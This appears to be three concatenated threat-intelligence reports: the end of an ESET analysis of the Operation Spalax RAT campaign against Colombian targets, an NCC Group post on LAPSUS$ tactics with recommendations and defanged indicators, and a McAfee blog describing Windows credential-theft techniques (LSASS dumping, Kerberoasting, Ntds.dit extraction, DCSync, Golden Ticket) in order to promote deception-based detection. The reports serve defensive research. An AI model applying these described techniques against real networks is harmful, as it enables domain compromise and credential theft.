Payloads The payloads used in Operation Spalax are remote access trojans.
These provide several capabilities not only for remote control, but also for spying on targets: keylogging, screen capture, clipboard hijacking, exfiltration of files, and the ability to download and execute other malware, to name a few. 
These RATs were not developed by the attackers.
They are: Remcos, sold online njRAT, leaked in underground forums AsyncRAT, open source There is not a one-to-one relationship between droppers and payloads, as we have seen different types of droppers running the same payload and also a single type of dropper connected to different payloads.
However, we can state that NSIS droppers mostly drop Remcos, while Agent Tesla and AutoIt packers typically drop njRAT. 
Remcos is a tool for remote control and surveillance.
It can be purchased with a six-month license that includes updates and support.
There is also a free version with limited functionalities.
While the tool can be used for legitimate purposes, it is also used by criminals to spy on their victims. 
Most of the Remcos samples used by this group are v2.5.0 Pro, but we have also seen all versions that were released since September 2019, which may indicate that the attackers bought a license after that month and have been actively using the different updates that they received during their six month license period. 
Regarding njRAT, this group mostly uses v0.7.3 (also known as the Lime version).
That version includes functionalities such as DDoS or ransomware encryption, but only spy features such as keylogging are used by the attackers.
For a more complete description of this version, refer to this 2018 article by Zscaler. 
Another njRAT version used by the attackers is v0.7d (the “green edition”) which is a simpler version focused on spying capabilities: keylogging, taking screenshots, access to webcam and microphone, uploading and downloading files, and executing other binaries. 
The final type of payload that we will mention is AsyncRAT.
In all cases we have observed v0.5.7B, which can be found on GitHub, has been used.
The functionalities in this RAT are similar to those in the previously mentioned RATs, which allow attackers to spy on their victims. 
Network infrastructure During our research we saw approximately 70 different domain names used for C&C in the second half of 2020.
This amounts to at least 24 IP addresses.
By pivoting on passive DNS data for IP addresses and known domain names, we found that the attackers have used at least 160 additional domain names since 2019.
This corresponds to at least 40 further IP addresses. 
They’ve managed to operate at such scale by using Dynamic DNS services.
This means that they have a pool of domain names (and also register new ones on a regular basis) that are dynamically assigned to IP addresses.
This way a domain name can be related to several IP addresses over a period of time and IP addresses can be related to many domain names.
Most of the domain names we have seen were registered with Duck DNS, but they have also used DNS Exit for publicvm.com and linkpc.net subdomains. 
Regarding IP addresses, almost all of them are in Colombia.
Most are IP addresses related to Colombian ISPs: 60% of them are Telmex and 30% EPM Telecomunicaciones (Tigo).
As it is highly unlikely that the criminals own so many residential IP addresses, it is possible that they use some victims as proxies, or some vulnerable devices to forward communication to their real C&C servers. 
Finally, a subset of the IP addresses belongs to Powerhouse Management, a VPN service provider.
They are used in conjunction with DNS Exit subdomains.
Similar findings can be found in this analysis by Lab52. Conclusion Targeted malware attacks against Colombian entities have been scaled up since the campaigns that were described last year.
The landscape has changed from a campaign that had a handful of C&C servers and domain names to a campaign with very large and fast-changing infrastructure with hundreds of domain names used since 2019.
Even though TTPs have seen changes, not only in how malware is delivered in phishing emails but also in the RATs used, one aspect that remains the same is that the attacks are still targeted and focused on Colombian entities, both in the public and private sectors.
It should be expected that these attacks will continue in the region for a long time, so we will keep monitoring these activities. 
A comprehensive list of Indicators of Compromise (IoCs) and samples can be found in our GitHub repository. 
For any inquiries, or to make sample submissions related to the subject, contact us at threatintel@eset.com. 
MITRE ATT&CK techniques Note: This table was built using version 7 of the MITRE ATT&CK framework. 
TacticIDNameDescription Initial AccessT1566.001Phishing:
Spearphishing AttachmentThe attackers have used emails with PDF or RTF files attached that contain a link to download malware. 
T1566.002Phishing:
Spearphishing LinkThe attackers have used emails with a link to download malware. 
ExecutionT1059.005Command and Scripting Interpreter:
Visual BasicThe attackers have used droppers that dump VBS files with commands to achieve persistence. 
T1059.003Command and Scripting Interpreter:
Windows Command ShellThe attackers have used RATs that can launch a command shell for executing commands. T1106Native
APIThe attackers have used API calls in their droppers, such as CreateProcessA, WriteProcessMemory and ResumeThread, to load and execute shellcode in memory. 
T1204.001User Execution: Malicious LinkThe attackers have attempted to get users to open a malicious link that leads to the download of malware. 
T1204.002User Execution: Malicious FileThe attackers have attempted to get users to execute malicious files masquerading as documents. PersistenceT1547.001Boot or Logon Initialization Scripts: Registry Run Keys / Startup
FolderThe attackers have used RATs that persist by creating a Run registry key or by creating a copy of the malware in the Startup folder. 
T1053.005Scheduled Task/Job: Scheduled TaskThe attackers have used scheduled tasks in their droppers and payloads to achieve persistence. 
Privilege EscalationT1548.002Abuse Elevation Control Mechanism: Bypass User Access ControlThe attackers have used RATs that implement UAC bypassing. 
Defense EvasionT1140Deobfuscate/Decode Files or InformationThe attackers have used various encryption algorithms in their droppers to hide strings and payloads. 
T1562.001Impair Defenses: Disable or Modify ToolsThe attackers have used CyaX packer, which can disable Windows Defender. 
T1070.004Indicator Removal on Host:
File DeletionThe attackers have used malware that deletes itself from the system. 
T1112Modify RegistryThe attackers have used RATs that allow full access to the Registry, for example to clear traces of their activities. 
T1027.002Obfuscated Files or Information:
Software PackingThe attackers have used various layers of packers for obfuscating their droppers. 
T1027.003Obfuscated Files or Information:
SteganographyThe attackers have used packers that read pixel data from images contained in PE files’ resource sections and build the next layer of execution from the data. 
T1055.002Process Injection: Portable Executable InjectionThe attackers have used droppers that inject the payload into legitimate processes such as RegAsm.exe, MSBuild.exe and more. 
T1497.001Virtualization/Sandbox Evasion:
System ChecksThe attackers have used droppers and payloads that perform anti-analysis checks to detect virtual environments and analysis tools. 
Credential AccessT1555.003Credentials from Password Stores: Credentials from Web BrowsersThe attackers have used various RATs with modules that steal passwords saved in victim web browsers. 
DiscoveryT1010Application
Window
DiscoveryThe attackers have used droppers and RATs that gather information about opened windows. T1083File and Directory
DiscoveryThe attackers have used various RATs that can browse file systems. 
T1120Peripheral Device
DiscoveryThe attackers have used njRAT, which attempts to detect if the victim system has a camera during the initial infection. 
T1057Process
DiscoveryThe attackers have used various RATs with modules that show running processes. 
T1012Query RegistryThe attackers have used various RATs that can read the Registry. 
T1018Remote System DiscoveryThe attackers have used njRAT, which can identify remote hosts on connected networks. 
T1518.001Software Discovery: Security Software
DiscoveryThe attackers have used droppers that check for security software present in a victim’s computer. 
T1082System Information
DiscoveryThe attackers have used various RATs that gather system information such as computer name and operating system during the initial infection. T1016System Network Configuration DiscoveryThe attackers have used various RATs that can collect the IP address of the victim machine. 
T1049System Network Connections DiscoveryThe attackers have used various RATs that can list network connections on a victim’s computer. 
T1033System Owner/
User DiscoveryThe attackers have used various RATs that retrieve the current username during initial infection. 
T1007System
Service DiscoveryThe attackers have used various RATs that have modules to manage services on the system. 
T1021.001Remote Services: Remote Desktop ProtocolThe attackers have used various RATs that can perform remote desktop access. 
T1091Replication
Through Removable MediaThe attackers have used njRAT, which can be configured to spread via removable drives. 
CollectionT1123Audio
CaptureThe attackers have used various RATs that can capture audio from the system’s microphone. 
T1115Clipboard
DataThe attackers have used various RATs that can access and modify data from the clipboard. T1005Data from Local SystemThe attackers have used various RATs that can access the local file system and upload, download or delete files. 
T1056.001Input Capture:
KeyloggingThe attackers have used various RATs that have keylogging capabilities. 
T1113Screen
CaptureThe attackers have used various RATs that can capture screenshots of victim machines. 
T1125Video
CaptureThe attackers have used various RATs that can access the victim’s webcam. Command and ControlT1132.001Data Encoding: Standard EncodingThe attackers have used njRAT, which uses base64 encoding for C&C traffic. 
T1573.001Encrypted Channel:
Symmetric CryptographyThe attackers have used Remcos RAT, which uses RC4 for encrypting C&C communications. 
T1095Non-Application Layer ProtocolThe attackers have used various RATs that use TCP for C&C communications. 
T1571Non-Standard PortThe attackers have used various RATs that communicate over different port numbers. 
ExfiltrationT1041Exfiltration
Over C2 ChannelThe attackers have used various RATs that exfiltrate data over the same channel used for C&C. 12 Jan 2021 - 11:30AM 
title: LAPSUS$: Recent techniques, tactics and procedures url: https://research.nccgroup.com/2022/04/28/lapsus-recent-techniques-tactics-and-procedures/ Authored by: David Brown, Michael Matthews and Rob Smallridge tl;dr This post describes the techniques, tactics and procedures we observed during recent LAPSUS$ incidents. 
Our findings can be summarised as below: Access and scraping of corporate Microsoft SharePoint sites in order to identify any credentials which may be stored in technical documentation.
Access to local password managers and databases to obtain further credentials and escalate privileges.
Living of the land – tools such as RVTools to shut down servers and ADExplorer to perform reconnaissance.
Cloning of git repositories and extraction of sensitive API Keys.
Using compromised credentials to access corporate VPNs.
Disruption or destruction to victim infrastructure to hinder analysis and consume defensive resource. 
Summary LAPSUS$ first appeared publicly in December 2021, however, NCC Group first observed LAPSUS$ months prior during an incident response engagement.
We believe the group has also operated prior to this date, though perhaps not under the “LAPSUS$” banner. 
Over the last 5 months, LAPSUS$ has gained large notoriety with some successful breaches of some large enterprises including, Microsoft, Nvidia, Okta & Samsung.
Little is still known about this group with motivations appearing to be for reputation, money and “for the lulz”. 
Notifications or responsibility of victims by LAPSUS$ are commonly reported via their telegram channel and in one case a victim’s DNS records were reconfigured to LAPSUS$ controlled domains/websites.
However, not all victims or breaches appear to actively be announced via their telegram channel, nor are some victims approached with a ransom.
This distinguishes themselves from more traditional ransomware groups who have a clear modus operandi and are clearly financially focused.
The result of this is that LAPSUS$ are less predictable which may be why they have seen recent success. 
This serves as a reminder for defenders for defence in depth and the need to anticipate different tactics that threat actors may use. 
It is also worth mentioning the brazen behaviour of this threat actor and their emboldened attempts at Social Engineering by offering payment for insiders to provide valid credentials. 
This tactic is potentially in response to greater home working due to the pandemic which means there is a far larger proportion of employees with VPN access and as such a greater pool of potential employees willing to sell their credentials. 
To combat this, organisations need to ensure they have extensive VPN logging capabilities, robust helpdesk ticketing as well as methods to help identify anomalies in VPN access. 
It is notable that the majority of LAPSUS$ actions exploit the human element as opposed to technical deficiencies or vulnerabilities.
Although potentially viewed as unsophisticated or basic these techniques have been successful, so it is vital that organisations factor in controls and mitigations to address them. 
Initial access Threat Intelligence shows that LAPSUS$ utilise multiple methods to gain Initial access. 
The main source of initial access is believed to occur via stolen authentication cookies which would grant the attacker access to a specific application.
These cookies are usually in the form of Single sign-on (SSO) applications which would allow the attacker to pivot into other corporate applications ultimately bypassing controls such as multi-factor authentication (MFA). 
Credential access and Privilege escalation Credential Harvesting and privileged escalation are key components of the LAPSUS$ breaches we have seen, with rapid escalation in privileges the LAPSUS$ group have been seen to elevate from a standard user account to an administrative user within a couple of days. 
In the investigations conducted by NCC Group, little to no malware is used.
In one case NCC Group observed LAPSUS$ using nothing more than the legitimate Sysinternals tool ADExplorer, which was used to conduct reconnaissance on the victim’s environment. 
Access to corporate VPNs is a primary focus for this group as it allows the threat actor to directly access key infrastructure which they require to complete their objectives. 
In our incident response cases, we saw the threat actor leveraging compromised employee email accounts to email helpdesk systems requesting access credentials or support to get access to the corporate VPN. 
Lateral Movement In one incident LAPSUS$ were observed to sporadically move through the victim environment via RDP in an attempt to access resources deeper in the victim environment.
In some instances, victim controlled hostnames were revealed including the host “VULTR-GUEST” which refers to infrastructure hosted on the private cloud service, Vultr[3]. 
Exfiltration LAPSUS$’s action on objectives appears to focus on data exfiltration of sensitive information as well as destruction or disruption.
In one particular incident the threat actor is observed to utilise the free file drop service “filetransfer[.]io”. 
Impact NCC Group has observed disruption and destruction to client environments by LAPSUS$ such as shutting down virtual machines from within on-premises VMware ESXi infrastructure, to the extreme of mass deletion of virtual machines, storage, and configurations in cloud environments making it harder for the victim to recover and for the investigation team to conduct their analysis activities. 
The theft of data reported appears to heavily be focused on application source code or proprietary technical information.
With a targeting of internal source code management or repository servers.
These git repositories can contain not only commercially sensitive intellectual property, but also in some cases may include additional API keys to sensitive applications including administrative or cloud applications. 
Recommendations Ensure that Cloud computing environments have sufficient logging enabled.
Ensure that cloud administrative access is configured to prevent unauthorised access to resources and that API keys are not overly permissive to the permissions they require.
Utilise MFA for user authentication on both cloud and remote access solutions to help reduce the risk of unauthorised access.
Ensure logging is in place to record MFA device enrolmentSecurity controls such as Conditional Access can help restrict or prevent unauthorised access based on criteria such as geographical location.
Implement activities to detect and investigate anomalies in VPN access.
Ensure a system is in place to record all helpdesk queries.
Avoid using SMS as an MFA vector to avoid the risk of SIM swapping.
Securing source code environments to ensure that users can only access the relevant repositories.
Secret Scanning[1][2] on source code repositories should be conducted to ensure that sensitive API credentials are not stored in source code.
GitHub and Gitlab offer detection mechanisms for thisRemote Desktop services or Gateways used as a primary or secondary remote access solution should be removed from any corporate environment in favour for alternative solutions such as secured VPNs, or other Remote Desktop applications which mitigate common attack techniques such as brute force or exploitation and can offer additional security controls such as MFA and Conditional Access.
Centralise logging including cloud applications (SIEM solution).Offline or immutable backups of servers should be taken to ensure that in the event of a data disruption or destruction attack, services can be restored.
Reduce MFA token/Session cookie validity timesEnsure principle of least privilege for user accounts is being adhered to.
Social engineering awareness training for all staff. 
Indicators of Compromise Indicator ValueIndicator TypeDescription104.238.222[.]158IP
addressMalicious Lapsus Network Address108.61.173[.]214IP
addressMalicious Lapsus Network Address185.169.255[.]74IP addressMalicious Lapsus Network AddressVULTR-GUESTHostnameThreat Actor Controlled Hosthxxps://filetransfer[.]ioDomainFree
File Drop Service Utilised by the Threat Actor MITRE ATT&CK Technique CodeTechniqueT1482Discovery – Domain Trust DiscoveryT1018Discovery – Remote System DiscoveryT1069.002Discovery –
Groups Discovery: Domain GroupsT1016.001Discovery – System Network Configuration DiscoveryT1078.002Privilege Escalation – Domain AccountsT1555.005Credential Access – Credentials from Password Stores: Password ManagersT1021.001Lateral Movement – Remote Services:
Remote Desktop ProtocolT1534Lateral Movement – Internal SpearphishingT1072Execution – Software Deployment ToolsT1213.002Collection – Data from Information Repositories: SharepointT1039Collection – Data from Network Shared DriveT1213.003Collection – Data from Information Repositories: Code RepositoriesT1567Exfiltration – Exfiltration Over Web ServiceT1485Impact – Data DestructionT1529Impact – System Shutdown/Reboot References https://docs.github.com/en/code-security/secret-scanning/about-secret-scanninghttps://docs.gitlab.com/ee/user/application_security/secret_detectionhttps://www.vultr.com/ 
title: Detecting Credential Stealing Attacks Through Active In-Network Defense url: https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-atr/detecting-credential-stealing-attacks-through-active-in-network-defense/ Executive Summary Today, enterprises tend to use multiple layers of security defenses, ranging from perimeter defense on network entry points to host based security solutions deployed at the end user’s machines to counter the ever-increasing threats.
This includes inline traffic filtering and management security solutions deployed at access and distribution layers in the network, as well as out of band solutions like NAC, SIEM or User Behavior Analysis to provide identity-based network access and gain more visibility into the user’s access to critical network resources.
However, layered security defenses face the major and recurring challenge of detecting newer exploitation techniques as they heavily rely on known behaviors.
Additionally, yet another significant challenge facing the enterprise network is detecting post-exploitation activities, after perimeter security is compromised. 
Post initial compromise, to be able to execute meaningful attacks, attackers would need to steal credentials to move laterally inside the network, access critical network assets and eventually exfiltrate data.
They will use several sophisticated techniques to perform internal reconnaissance and remote code execution on critical resources, which range from using legitimate operating system tools to discover network assets to using novel code execution techniques on the target.
Consequently, differentiating between the legitimate and malicious use of Windows’ internal tools and services becomes a high priority for enterprise networks. 
To tackle this long-standing problem of detecting lateral movement, enterprise networks must formulate active in-network defense strategies to effectively prevent attackers from accessing critical network resources.
Network Deception is one such defensive approach which could potentially prove to be an effective solution to detect credential theft attacks.
Detecting credential stealing attacks with deception essentially requires building the necessary infrastructure by placing the decoy systems within the same network as production assets and configuring them with decoy contents to lure the attackers towards the decoy machines and services.
Accurately configuring and tuning the deceptive network can deflect the attacker’s lateral movement path towards the deceptive services, consequently allowing the attackers to engage with the deceptive network, helping enterprises protect production assets. 
MITRE Shield, a knowledge base maintained by MITRE for active defense techniques highlights many of the methods in adversary engagement.
Some of the techniques described by MITRE Shield Matrix with respect to network deception are as below: MITRE Shield Description ATT&CK Technique Decoy Account – DTE0010 A decoy account is created for defensive or deceptive purposes.
The decoy account can be used to make a system, service, or software look more realistic or to entice an action Account Discovery, Reconnaissance Decoy Credentials – DTE0012 Seed a target system with credentials (such as username/password, browser tokens, and other forms of authentication data) Credential Access, Privilege Escalation Decoy Diversity – DTE0013 deployment of decoy systems with varying Operating Systems and software configurations Reconnaissance Decoy Network – DTE0014 Multiple computing resources that can be used for defensive or deceptive purposes Initial Access Decoy Personna – DTE0015 Used to establish background information about a user.
In order to have the adversary believe they are operating against real targets Initial Access, Discovery, Reconnaissance Decoy System – DTE0017 Computing resources presented to the adversary in support of active defense Reconnaissance Over the course of this paper, we will discuss some of the widely adapted credential theft attacks executed by adversaries after the initial compromise and then move on to discuss defense techniques against the above MITRE Shield attacks and how to use them effectively to detect deceptive credential usage in the network. 
Network Deception – An Active in-network defensive approach Most of the targeted attacks involve stealing credentials from the system at a certain point in time as attackers would use them to pivot to other systems in the network.
Some of the credential stealing techniques like Golden Ticket attacks have been found to be used in multiple ransomwares armed with lateral movement capabilities. 
Active in-network defense strategies described by the MITRE Shield matrix are significant and play a critical role in detecting credential abuse in the network. 
Network Deception uses these active defense techniques to build the deceptive network infrastructure which could potentially lead to redirecting an attacker’s lateral movement path and engaging them to the decoy services without touching the critical production systems. 
It involves placing decoy systems, decoy credentials and decoy contents all throughout the production network essentially converting it into a trap, playing a crucial role in mitigating the attacks. 
McAfee Protection McAfee MVISION Endpoint Security has the capabilities to protect against credential theft attacks like credential extraction from LSASS process memory via ATP rule 511.
More details on configuring policies and a demo are available here. 
McAfee MVISION Endpoint Detection and Response (EDR) has the capabilities to detect credential access from tools like Mimikatz. 
With McAfee MVISION EDR and ENS integration with Attivo’s network and endpoint deception sensor, McAfee can manage its agents and receive alerts for detections in ePO and EDR. 
Lateral Movement – Introduction Lateral movement refers to the tools and techniques used by attackers to progressively expand their foothold within an enterprise network after gaining initial access.
As shown in the figure below, lateral movement activity comprises of several stages starting from credential theft, target enumeration and discovery, privilege escalation, gaining access to network resources and eventually remote code execution on the target before exfiltrating data to accomplish a successful attack.
Once inside the network, attackers will deploy a range of techniques at each stage of lateral movement to achieve their end goal.
One of the primary challenges an attacker will face while moving laterally inside a network is to hide their activities in plain sight by generating a minimum volume of legitimate looking logs to be able to remain undetected.
To achieve this, an attacker might choose to embed the tool within a malicious executable or use the operating system’s internal legitimate tools and services to perform its lateral movement operations, consequently making this network traffic harder to distinguish. 
As per the Verizon DBIR report 2020, over 80% of data breaches involve credential theft attacks.
Credential theft is one of the primary tasks attackers need to perform post-exploitation and after gaining initial control of the target machine.
It will usually be the first step towards lateral movement strategies which will allow attackers to elevate their privileges and acquire access to other network resources.
As indicated earlier, attackers have long been abusing Windows legitimate features like SMB, RPC over SMB, Windows Management Instrumentation, Windows Remote Management, and many other features to perform lateral movement activities.
Figure 1 below highlights where lateral movement falls within the attack chain and its different stages.
To remain stealthier, these activities would span a period ranging from many weeks to months. 
Figure 1 – Stages of Lateral movement To be able to distinguish between the admissible and malicious use of these inbuilt services, it is extremely critical for organizations to deploy advanced Threat Detection solutions.
Over the course of this blog, we will discuss various credential theft techniques used by adversaries during lateral movement.
We will also discuss an approach that can be used to effectively detect these techniques inside the network. 
Credential Theft Attacks Attackers use a variety of tools and techniques to execute credential theft attacks.
Many of these tools are open source and readily available on the internet.
Operating systems like Windows implement Single Sign
On (SSO) functionality, which require the user’s credentials to be stored in memory, thereby allowing the OS to seamlessly access network resource without repeatedly asking the user to re-enter those credentials.
Additionally, user credentials are stored in memory in a variety of formats like NTLM hashes, reversibly encrypted plaintext, Kerberos tickets, PINs, etc., which can be used to authenticate to services depending upon the supported authentication mechanism.
These credentials can be acquired by attackers from memory by parsing appropriate credential storage structures or using the Windows credential enumeration APIs. 
Consequently, these attacks pose major security concerns, especially in the domain environment if the attacker gains access to privileged credentials which can then be reused to access critical network resources.
In the following sections, we discuss some of the widely adapted credential stealing techniques used by malware, with respect to the Windows operating system.
Similar credential stealing techniques can also be used with other operating systems as well. 
Stealing Credentials from LSASS Process Memory The Local Security Authority Subsystem Service (LSASS) process manages and stores the credentials of all the users with active Windows sessions.
These credentials stored in the LSASS process memory will allow users to access other network resource such as files shares, email servers and other remote services without asking them for the credentials again.
LSASS process memory stores the credentials in many formats including reversibly encrypted plaintext, NTLM hashes, Kerberos Tickets (Ticket Granting Tickets, etc.).
These credentials are generated and stored in the memory of the LSASS process when a user initiates the interactive logon to the machine such as console logon or RDP, runs a scheduled task or uses remote administration tools.
The encryption and decryption of credentials is done using LsaProtectMemory and LsaUnProtectMemory respectively and hence a decryption tool using these APIs will be able to decrypt LSASS memory buffers and extract them.
However, malware would need to execute with local administrator privileges and enable “SeDebugPrivilege” on the current process to be able access the LSASS process memory. 
Below is a code snapshot from one of the famous credential harvesting tools, Mimikatz, enabling the required privileges on the calling thread before dumping the credentials. 
Figure 2 – Checking for required privileges We can see that the NTLM hash of the user’s credentials is revealed, and this can be brute forced offline as shown below.
Many Windows services, such as SMB, support NTLM authentication and NTLM hashes can be used directly for authentication eliminating the need for the clear text passwords. 
Figure 3 – Cracking NTLM Hashes offline Attackers avoid using freely available tools like Mimikatz directly on the target machine to harvest credentials since they are easily detected by AVs.
Instead, they use recompiled clones of it with minimal functionality to avoid noise.
Below is one such instance where malware embeds recompiled Mimikatz code with the minimal required functionality. 
Figure 4 – Credential extraction tool embedded inside malicious executable Detection can also be avoided by using several “living off the land’ mechanisms, available in many post-exploitation frameworks, to execute the credential harvesting tools directly from memory using Reflective PE injection, where the binary is never written to the disk.
Yet another approach is to dump the LSASS process memory using process dumping tools, exfiltrate the dump and extract the credentials offline.
Microsoft has documented multiple ways to configure additional LSASS process protection which can prevent credentials being compromised. 
Stealing Credentials from Security Accounts Manager (SAM) Database The SAM database is a file on a local hard drive that stores the credentials for all local accounts on the Windows computer.
NT hashes for all the accounts on the local machine, including the local administrator credential hash, are stored in the SAM database.
The SAM database file is in %SystemRoot%system32/config and the hashes of the credentials are within the registry HKLM\SAM.
Attackers need to acquire elevated privileges to be able to access the credentials from the SAM database.
The example below demonstrates how the credentials from the SAM database can be revealed through a simple Meterpreter session. 
Figure 5 – Dumping SAM database Stealing Credentials from Windows Credential Manager (CredMan) Windows Credential Manager stores the Web and SMB/RDP credentials of users if they choose to save them on the Windows machine, thereby preventing the authentication mechanism from asking for those passwords again on subsequent logins.
These credentials are encrypted with Windows Data Protection APIs (DPAPI) CryptProtectData, either using the current user’s logon session or a generated master key, and then saved on the local hard drive.
Consequently, any process running in the context of the logged in user will be able to decrypt the credentials using CryptUnProtectData DPAPI.
In the domain environment, these credentials can be used by attackers to pivot to other systems in the network.
Data Protection APIs provide the cryptographic functionalities that can be used to securely store credentials and keys.
These APIs are used by several other Windows components like browsers (IE/Chrome), certificates and many other applications as well.
Below is one example of how credential dumping tools like Mimikatz can be used to dump stored Chrome credentials. 
Figure 6 – Dumping browser credentials DPAPI can be abused in multiple ways.
In the Active Directory domain joined environment, if other users have logged into the compromised machine, provided a malware is running with escalated privileges, it can extract other user’s master keys from the LSASS memory which can then be used to decrypt their secrets.
Below is a screenshot of how the master key can be extracted by using the credential dumping tool. 
Figure 7 – Extracting DPAPI Master Key Malware also tends to use multiple variants of credential enumeration APIs available within Windows.
These APIs can extract credentials from Windows Credential Manager.
Below is one instance of the malware using CredEnumerateW API to retrieve credentials and then search for terminal services passwords which It would use to pivot to other systems. 
Figure 8 – Extracting credentials using Windows API Stealing Service Account Credentials Through Kerberoasting In the domain joined environment, the Kerberos protocol has a significant role to play with respect to authentication and requesting access to services and applications.
It provides Single-Sign-On functionality for accessing multiple shared resources within the enterprise network.
The Kerberos authentication mechanism in Active Directory involves multiple requests and responses like Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS) supported by a Key Distribution Server (KDC), usually a Domain Controller.
Upon successful authentication, a user will be able to access the respective services. 
Attackers gaining access to a system joined in the domain would usually look for high value assets like Active Directory Controller, Database server, SharePoint server, Web Server, etc., and these services are registered in the domain with the specific Service Principal Name (SPN) values, which is a unique identifier of the Service Account in the domain.
These SPN values are used by Kerberos to map the instance with the logon account allowing the client to authenticate to the respective service.
Well known SPN values are listed out here.
Once the attacker is authenticated with any domain user credentials and has information about the SPN values of the services within the domain, they can initiate the Kerberos Ticket Granting Service request (TGS – REQ) to the Key Distribution Server with the specified SPN value.
Details on how the SPN values are registered and used in Kerberos authentication is documented here.
TGS response from the KDC will have the Kerberos Ticket encrypted with the hash of the service account.
This ticket can be extracted from the memory and can be brute forced offline to acquire service account credentials, allowing a domain user to gain admin level access to the service. 
Kerberoasting is a well-documented attack technique listed in MITRE ATT&CK and it essentially abuses the Kerberos authentication allowing adversaries to request the TGS Tickets for the valid service accounts and brute force the ticket offline to extract the plain text credentials of the service accounts, consequently enabling them to elevate their privileges from domain user to domain admin.
As an initial step to this lateral movement technique, the attacker would perform an internal reconnaissance to gain information about the services registered in the domain and get SPN values.
A simple PowerShell command after importing the Active Directory PowerShell module, as shown below, can initiate the LDAP query to get information about all the user accounts from the Domain Controller with the SPN value set. Figure 9 – PowerShell command to generate LDAP query Attackers can specifically choose to scan the domain for MSSQL service with the registered SPN value used for Kerberos authentication.
PowerShell scripts like GetUserSPNs can scan all the user SPNs in the domain or MSSQL service registered in the domain with Discover-PSMSSQLServers or Invoke-Kerberoast scripts. 
Following is an example output from the script: 
Figure 10 – Kerberoasting PowerShell script output Once an attacker has the SPN value of the SQL service, a Kerberos Ticket Granting Service Ticket request (TGS-REQ) can be initiated to the domain controller with the SPN value.
This can be done by a couple of PowerShell commands generating KRB-TGS-REQ as shown below: Figure 11 – Kerberos TGS request Consequently, the Domain Controller sends the TGS-RESP with the ticket of the service account which will be cached in the memory and can be extracted by dumping tools like Mimikatz as a .kirbi document.
This can be brute forced offline by tgsrespcrack, allowing the attacker to gain unrestricted access to the service with elevated privileges. 
Stealing Credentials from Active Directory Domain Service (ntdis.dit) File As indicted earlier, once an attacker has penetrated the domain network, it will be natural to progress towards targeting critical assets, such as the Active Directory controller.
The Active Directory Database Services AD DS Ntds.dit file is one of the most overlooked attack vectors in the domain environment but can have significant impact if the attacker is able to gain the domain administrative rights leading to complete domain compromise. 
The Ntds.dit file is the authoritative store of credentials for all the users in the domain joined environment, storing all the information about the users, groups and memberships, including credentials (NT Hashes) of all the users in the domain with historical passwords and user’s DPAPI backup master keys.
An Attacker with domain admin rights can gain access to the Domain Controller’s file system and acquire credentials like hashes, Kerberos tickets and other reversibly encrypted passwords of all the users joined in the domain by dumping and exfiltrating the Ntds.dit file.
These credentials can then be used by the attacker to further access resources by using attack techniques like PTH within the network since the credentials used across other shared resource could be same. 
Multiple techniques can be used to dump the Ntds.dit file from the Domain Controller locally as well as remotely and extract the NTLM hashes/DPAPI backup keys for all the domain joined users.
One of the techniques is to use the Volume Shadow Copy Service using the vssadmin command line utility and then extract the Ntds.dit file from the volume shadow copy as shown below. 
Figure 12 – Dumping Volume shadow copy for C drive Sensitive data on Active Directory is encrypted with the Boot Key (Syskey) stored in the SYSTEM registry hive and dumping the SYSTEM registry hive is a prerequisite as well to be able to extract all the credentials. 
Publicly available Active Directory auditing frameworks like DSInternals provide PowerShell cmdlets to extract the Syskey from the SYSTEM registry hive and extract all the credentials from the Ntds.dit file. 
Ntds.dit can also give access to the powerful service account within the Active Directory Domain, KRBTGT (Key Distribution Centre Service account).
Acquiring the NTLM hash of this account can enable the attacker to execute a Golden Ticket attack leading to complete domain compromise with unrestricted access to any service on the domain joined system. 
Stealing Credentials Through a DCSync Attack – From Domain user to Domain Admin A DCSync attack is a method of credential acquisition which allows an attacker to impersonate the Domain Controller and can consequently replicate all the Active Directory objects to the impersonating client remotely, without requiring the user to logon to the DC or dumping the Ntds.dit file.
By impersonating the Domain Controller, the attacker could acquire the NTLM hash of the KRBTGT service account, enabling them to gain access to all the shared resources and applications in the domain joined environment.
To be able to execute this credential stealing technique, an attacker would have to compromise the user account with the required permissions, specifically DS-Replication-Get-Changes and DS-Replication-Get-Changes-All, as shown below. 
Figure 13 – User with privileges Once the attacker compromises the user account with the required privileges, Pass-The-Hash attacks can be executed to spawn a command shell with the forged logon session.
Credential dumping tools like Mimikatz do this by enumerating all the user logon sessions and replacing the user credentials with the stolen usernames and NTLM hashes provided, in the current logon session.
Behind the scenes, this is executed by duplicating the current process’s access token, replacing the user credentials pointed by duplicated access token and subsequently using the modified access token to start a new process with the stolen credentials which will be used for network authentication.
This is as shown below for example user “DCPrivUser”. 
Figure 14 – Pass-the-Hash attack Further, as indicated below, any subsequent NTLM authentication from the logon session will use the stolen credentials to authenticate to domain joined systems like the Active Directory Controller. 
Attackers can now initiate the AD user objects Replication request to the Domain Controller using Directory Replication Services Remote Protocol (DRSUAPI).
DRSUAPI is the RPC protocol used for replication of AD objects.
With DCERPC bind request to DRSUAPI, an RPC call to DSGetNCChanges will replicate all the user AD objects to the impersonating client.
Attackers would usually target the KRBTGT account since acquiring the NTLM hash of this account will enable them to execute a Golden Ticket attack resulting in unrestricted access to domain services and applications. 
Figure 15 – DCSync Attack As indicated earlier, with the NTLM hash of the KRBTGT account, adversaries can initiate a Golden Ticket attack (Pass-the-Ticket) by injecting the forged Kerberos tickets into the current session which can be used to authenticate to any service with the client that supports pass the ticket (for instance, sqlcmd.exe connection to DB server, PsExec, etc.) 
Figure 16 – Golden ticket with forged Kerberos ticket Detecting Credential Stealing Attacks with Network Deception 
The credential theft techniques we discussed in the previous sections are just the tip of the iceberg.
Adversaries can use many other sophisticated credential stealing techniques to take advantage of system misconfigurations and legitimate administrative tools and protocols and, at the same time, remain undetected for a longer period.
With many other event management solutions with SIEMs, used in conjunction with other network security solutions, it becomes a challenge for administrators to distinguish malicious use of legitimate tools and services from lateral movement.
Perimeter solutions have their limitations in terms of visibility once the attacker crosses the network boundary and is inside the domain environment.
It is extremely critical for organizations to protect and monitor critical network assets like the Domain Controller, Database server, Exchange Servers, build systems and other applications or services, as compromising these systems will result in significant damages.
Therefore, enterprise networks must deploy a solution to detect credential stealing attacks as they can be used to pivot to other systems on the network and move laterally once an attacker establishes an attack path to a high value target.
If the deployment of a solution within the critical zones of the network can detect the use of stolen credentials before adversaries can reach their target, the critical assets could still be prevented from being compromised. 
